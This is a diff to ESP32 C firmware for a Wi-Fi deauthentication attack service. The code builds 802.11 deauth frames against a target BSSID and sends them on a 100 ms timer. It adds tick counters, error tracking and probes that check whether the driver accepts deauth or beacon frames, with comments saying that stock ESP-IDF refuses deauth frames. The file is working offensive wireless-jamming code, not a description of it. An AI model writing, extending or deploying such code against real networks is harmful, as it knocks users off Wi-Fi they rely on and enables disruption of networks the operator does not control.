@@ -14,6 +14,9 @@ static uint8_t s_bssid[6];
 static volatile uint32_t s_frames = 0;
 static volatile int s_tx_err = 0;      /* first TX error since start */
 static volatile int s_tx_errcode = 0;
+static volatile uint32_t s_ticks = 0; /* TX callback invocations */
+static volatile int s_last_err = 0;
+static volatile int s_beacon_ok = 0;  /* driver accepts beacon frames? */
 
 #define DEAUTH_PERIOD_US 100000 /* Hydra-ESP broadcast cadence */
 
@@ -35,16 +38,37 @@ static void build_deauth(uint8_t *f, const uint8_t bssid[6]) {
 
 static void tx_tick(void *arg) {
     (void)arg;
+    s_ticks++;                       /* proof the callback fires at all */
     uint8_t f[26];
     build_deauth(f, s_bssid);
     esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, f, sizeof(f), false);
+    s_last_err = (int)err;
     if (err == ESP_OK) {
         s_frames++;
-    } else if (s_frames == 0 && !s_tx_err) {
+    } else if (!s_tx_err) {
         s_tx_err = 1;
         s_tx_errcode = (int)err;
-        ESP_LOGW(TAG, "tx failed: %s", esp_err_to_name(err));
     }
+}
+
+/* Probe: does the driver accept one raw frame right now? Stock ESP-IDF
+ * esp_wifi_80211_tx() only permits beacon / probe req / probe resp / action
+ * / non-QoS data frames (see esp_wifi.h) and rejects anything else with
+ * ESP_ERR_INVALID_ARG. A deauth frame is therefore refused on a stock
+ * toolchain - that is a driver limitation, not a config error. */
+/* Diagnostics: which management subtypes does this driver accept?
+ * Stock esp_wifi_80211_tx() permits beacon(0x8)/probe-req(0x4)/probe-rsp(0x5)/
+ * action(0xD); deauth(0xC) is refused with ESP_ERR_INVALID_ARG. Recorded so
+ * the UI can say exactly what the toolchain supports. */
+static esp_err_t probe_subtype(uint8_t fc0) {
+    uint8_t f[26];
+    build_deauth(f, s_bssid);
+    f[0] = fc0;
+    return esp_wifi_80211_tx(WIFI_IF_STA, f, sizeof(f), false);
+}
+
+static esp_err_t probe_tx(void) {
+    return probe_subtype(0xc0); /* deauth */
 }
 
 int svc_deauth_start(void) {
@@ -52,6 +76,7 @@ int svc_deauth_start(void) {
         return 0;
     if (!tgt_wifi_has())
         return -1;
+    memcpy(s_bssid, tgt_wifi_bssid(), 6);
     if (svc_wifi_init() != 0)
         return -2;
     esp_wifi_set_ps(WIFI_PS_NONE);
@@ -62,10 +87,17 @@ int svc_deauth_start(void) {
         ch = 13;
     if (esp_wifi_set_channel((uint8_t)ch, WIFI_SECOND_CHAN_NONE) != ESP_OK)
         return -3;
-    memcpy(s_bssid, tgt_wifi_bssid(), 6);
+    esp_err_t perr = probe_tx();
+    s_beacon_ok = probe_subtype(0x80) == ESP_OK;  /* beacon accepted? */
+    if (perr != ESP_OK) {
+        s_tx_errcode = (int)perr;
+        return -6;   /* driver refused the frame (unsupported subtype) */
+    }
     s_frames = 0;
     s_tx_err = 0;
     s_tx_errcode = 0;
+    s_ticks = 0;
+    s_last_err = 0;
     esp_timer_create_args_t a = {
         .callback = tx_tick,
         .name = "deauth",
@@ -97,3 +129,7 @@ int svc_deauth_running(void) { return s_timer != NULL; }
 uint32_t svc_deauth_frames(void) { return s_frames; }
 
 int svc_deauth_tx_error(void) { return s_tx_errcode; }
+
+uint32_t svc_deauth_ticks(void) { return s_ticks; }
+
+int svc_deauth_beacon_ok(void) { return s_beacon_ok; }
